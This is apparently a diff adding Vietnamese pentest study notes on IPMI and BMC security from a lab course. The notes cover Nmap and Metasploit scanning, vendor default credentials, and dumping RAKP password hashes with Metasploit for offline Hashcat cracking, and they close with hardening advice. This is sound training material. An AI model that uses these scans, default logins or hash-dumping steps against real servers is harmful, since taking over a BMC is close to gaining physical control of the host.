@@ -1,0 +1,142 @@
+
+IPMI (Intelligent Platform Management Interface) là bộ tiêu chuẩn dùng cho quản lý và giám sát phần cứng ở cấp thấp.
+Hoạt động độc lập với BIOS, CPU, firmware và hệ điều hành.
+Cho phép quản trị viên quản lý hệ thống dù máy đang tắt hoặc bị treo.
+Kết nối trực tiếp đến phần cứng qua mạng, không cần đăng nhập vào hệ điều hành.
+Có thể thực hiện nâng cấp hoặc cấu hình từ xa mà không cần tiếp cận vật lý.
+Thường được sử dụng trong 3 trường hợp:
+  Trước khi hệ điều hành khởi động – chỉnh BIOS hoặc cấu hình hệ thống.
+  Khi máy đã tắt hoàn toàn – vẫn có thể truy cập và điều khiển.
+  Sau khi hệ thống gặp sự cố – hỗ trợ truy cập để khắc phục lỗi.
+
+Khi không dùng cho quản lý hay cấu hình, IPMI vẫn hoạt động để giám sát hệ thống.
+Có thể theo dõi các thông số phần cứng như:
+  Nhiệt độ hệ thống
+  Điện áp
+  Tốc độ/quạt làm mát
+  Nguồn điện (power supply)
+Hỗ trợ truy vấn thông tin phần cứng (inventory) và xem log lỗi phần cứng.
+Có khả năng gửi cảnh báo qua SNMP.
+Máy chủ có thể tắt, nhưng mô-đun IPMI vẫn cần nguồn điện và kết nối mạng LAN để hoạt động.
+
+IPMI được Intel công bố lần đầu năm 1998.
+Hiện được hơn 200 hãng hỗ trợ, bao gồm: Cisco, Dell, HP, Supermicro, Intel, …
+Phiên bản IPMI 2.0 cho phép quản trị qua Serial over LAN, giúp xem console output từ xa (in-band).
+Để hoạt động, IPMI cần các thành phần chính sau:
+  Baseboard Management Controller (BMC): vi điều khiển trung tâm, thành phần cốt lõi của IPMI.
+  Intelligent Chassis Management Bus (ICMB): giao diện cho phép giao tiếp giữa các khung máy (chassis).
+  Intelligent Platform Management Bus (IPMB): mở rộng khả năng của BMC.
+  IPMI Memory: lưu log sự kiện hệ thống, dữ liệu lưu trữ, v.v.
+  Communications Interfaces: các giao diện liên lạc, gồm giao diện nội bộ, serial, LAN, ICMB và PCI Management Bus.
+
+
+Port & giao thức: IPMI sử dụng UDP port 623 cho giao tiếp mạng.
+Thiết bị: Thiết bị chạy IPMI gọi là Baseboard Management Controller (BMC).
+Kiến trúc BMC: Thường là hệ thống nhúng ARM chạy Linux, gắn trực tiếp lên mainboard hoặc dưới dạng thẻ PCI mở rộng.
+Phổ biến: Hầu hết server có BMC tích hợp hoặc hỗ trợ lắp thêm — các BMC thường gặp trong pentest nội bộ: HP iLO, Dell DRAC, Supermicro IPMI.
+Giao diện quản lý: Nhiều BMC cung cấp web-based console, và giao thức truy cập từ xa như Telnet/SSH, bên cạnh IPMI trên UDP/623.
+Quyền lực khi chiếm được: Nếu truy cập được BMC, gần tương đương với quyền truy cập vật lý — có thể giám sát, reboot, tắt nguồn, hoặc cài lại OS của host.
+Footprinting: Dùng port UDP 623 để dò dịch vụ; có thể dùng các script NSE của Nmap (ví dụ ipmi-version) để fingerprint BMC.
+  Ví dụ Nmap (dò UDP + script):
+    nmap -sU -p 623 --script=ipmi-version <target>
+Rủi ro bảo mật: BMC bị lộ hoặc mật khẩu yếu dẫn tới toàn quyền kiểm soát hệ thống; nhiều vụ tấn công nhắm BMC do cấu hình mặc định/firmware lỗi thời.
+Kiểm tra thêm: ngoài port 623, kiểm tra web console, SSH/Telnet, và serial-over-LAN (nếu bật) để đánh giá bề rộng tiếp cận.
+Gợi ý bảo mật ngắn: cập nhật firmware BMC, đổi mật khẩu mặc định, hạn chế truy cập mạng tới management interface (VLAN/ACL), bật xác thực mạnh (LANplus / IPMI 2.0).
+
+nmap
+  naruto3co@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+    Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
+    Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
+    Host is up (0.00064s latency).
+    
+    PORT    STATE SERVICE
+    623/udp open  asf-rmcp
+    | ipmi-version:
+    |   Version:
+    |     IPMI-2.0
+    |   UserAuth:
+    |   PassAuth: auth_user, non_null_user
+    |_  Level: 2.0
+    MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
+    
+    Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
+
+Metasploit Version Scan
+  msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+  msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
+  msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
+  
+  Module options (auxiliary/scanner/ipmi/ipmi_version):
+  
+     Name       Current Setting  Required  Description
+     ----       ---------------  --------  -----------
+     BATCHSIZE  256              yes       The number of hosts to probe in each set
+     RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+     RPORT      623              yes       The target port (UDP)
+     THREADS    10               yes       The number of concurrent threads
+  
+  
+  msf6 auxiliary(scanner/ipmi/ipmi_version) > run
+  
+  [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
+  [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
+  [*] Scanned 1 of 1 hosts (100% complete)
+  [*] Auxiliary module execution completed
+
+Trong các bài kiểm tra xâm nhập nội bộ, chúng tôi thường phát hiện các BMC mà quản trị viên chưa thay đổi mật khẩu mặc định. Một số mật khẩu mặc định độc đáo cần lưu trong tài liệu hướng dẫn của chúng tôi bao gồm:
+  | Sản phẩm        | Tên đăng nhập   | Mật khẩu / Ghi chú                                           |
+  | --------------- | --------------- | ------------------------------------------------------------ |
+  | Dell iDRAC      | `root`          | `calvin`                                                     |
+  | HP iLO          | `Administrator` | `một chuỗi 8 ký tự ngẫu nhiên gồm chữ hoa (A–Z) và số (0–9)` |
+  | Supermicro IPMI | `ADMIN`         | `ADMIN`                                                      |
+
+
+Lỗ hổng RAKP (IPMI 2.0): server gửi salted hash mật khẩu trước khi xác thực.
+Hậu quả: hash có thể thu được cho mọi tài khoản hợp lệ và bẻ khóa offline.
+Công cụ: thường dùng Hashcat (-m 7300); ví dụ mask cho 8 ký tự chữ hoa+số.
+Quyền: chiếm BMC ≈ quyền vật lý (reboot, power off, cài lại OS).
+Khắc phục nhanh: đổi mật khẩu mặc định, cập nhật firmware, giới hạn truy cập mạng (VLAN/ACL), tắt IPMI nếu không cần.
+
+Không có patch hoàn chỉnh vì lỗ hổng là phần của đặc tả IPMI.
+Giảm rủi ro bằng: dùng mật khẩu rất dài/khó bẻ, và phân đoạn mạng (segmentation/ACL) để hạn chế truy cập trực tiếp tới BMC.
+Không bỏ qua IPMI khi làm pentest nội bộ — thường xuất hiện trong hầu hết đánh giá.
+Rủi ro thực tế: mật khẩu duy nhất nhưng có thể bẻ (crackable) thường bị tái sử dụng trên hệ thống khác, làm mở rộng phạm vi tấn công.
+Ví dụ thực tế: thu hash IPMI → bẻ offline bằng Hashcat → dùng credential đó SSH vào nhiều server quan trọng và truy cập web-console quản lý mạng.
+Kết luận ngắn: ưu tiên hardening mạng và mật khẩu BMC; coi việc phát hiện/điều tra IPMI là ưu tiên cao trong pentest.
+
+Để lấy lại mã băm IPMI, chúng ta có thể sử dụng mô-đun Lấy lại mã băm mật khẩu SHA1 từ xa Metasploit IPMI 2.0 RAKP.
+  
+  Metasploit Dumping Hashes
+    msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
+    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
+    
+    Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
+    
+       Name                 Current Setting                                                    Required  Description
+       ----                 ---------------                                                    --------  -----------
+       CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
+       OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
+       OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
+       PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
+       RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+       RPORT                623                                                                yes       The target port
+       THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
+       USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
+    
+    
+    
+    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+    
+    [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
+    [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+  
+
+
+
+
+
+
+
